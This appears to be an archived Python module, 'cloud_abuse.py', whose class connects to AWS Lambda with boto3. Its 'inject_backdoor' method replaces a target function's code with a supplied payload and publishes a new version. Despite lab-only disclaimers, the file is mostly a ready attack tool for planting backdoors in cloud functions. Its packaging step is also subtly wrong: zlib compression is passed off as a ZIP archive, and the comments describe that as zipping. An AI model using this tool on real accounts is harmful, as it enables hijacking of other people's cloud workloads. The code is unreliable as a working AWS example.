# archive/cloud_abuse.py
# (Originally src/modules/cloud_abuse.py)
import os
import boto3
import zlib
import logging

# Note: This is a utility/example for interacting with AWS Lambda.
# Requires boto3: pip install boto3
# Ensure AWS credentials are configured securely (e.g., via environment variables)
# only for use in isolated testing environments.

class AWSLambdaAbuse:
    """
    Demonstrates malicious Lambda code updates for testing.
    DO NOT use with real AWS credentials outside of isolated labs.
    """

    def __init__(self, region_name="us-west-2"):
        self.logger = logging.getLogger(__name__)
        
        # Best practice: Use boto3's default credential chain 
        # (env vars, shared credential file, config file, IAM role, etc.)
        # Avoid explicitly passing keys if possible.
        try:
            # Attempt to create client using default chain first
             self.session = boto3.Session(region_name=region_name)
             self.lambda_client = self.session.client('lambda')
             # Perform a simple test call to verify credentials
             self.lambda_client.list_functions(MaxItems=1) 
             self.logger.info(f"Successfully initialized boto3 Lambda client for region {region_name}")
        except Exception as e: # Catches credential errors, config errors etc.
             self.logger.error(f"Failed to initialize AWS Lambda client: {e}")
             self.lambda_client = None # Indicate failure
             raise EnvironmentError(f"AWS credentials/configuration error: {e}") from e

    def inject_backdoor(self, function_name: str, payload: bytes):
        """
        Compresses and updates the Lambda function code with the provided payload.
        Returns the updated function ARN or None on failure.
        """
        if not self.lambda_client:
             self.logger.error("Lambda client not initialized. Cannot inject backdoor.")
             return None
             
        if not function_name or not payload:
            self.logger.error("Function name and payload are required.")
            raise ValueError("Function name and payload are required.")
        
        try:
            # Lambda expects a zip file containing the code.
            # Here, we are directly zipping the payload bytes.
            # This assumes the payload IS the content of a valid handler file (e.g., lambda_function.py).
            # For more complex updates, create a proper zip archive.
            compressed_payload = zlib.compress(payload)
            
            self.logger.warning(f"Attempting to update Lambda function: {function_name}")
            response = self.lambda_client.update_function_code(
                FunctionName=function_name,
                ZipFile=compressed_payload,
                Publish=True # Publish a new version
            )
            updated_arn = response.get('FunctionArn')
            self.logger.info(f"Successfully updated Lambda function {function_name}. New ARN: {updated_arn}")
            return updated_arn
        except self.lambda_client.exceptions.ResourceNotFoundException:
             self.logger.error(f"Lambda function '{function_name}' not found.")
             return None
        except Exception as e:
            self.logger.error(f"Failed to update Lambda function code for {function_name}: {e}")
            raise # Re-raise unexpected errors 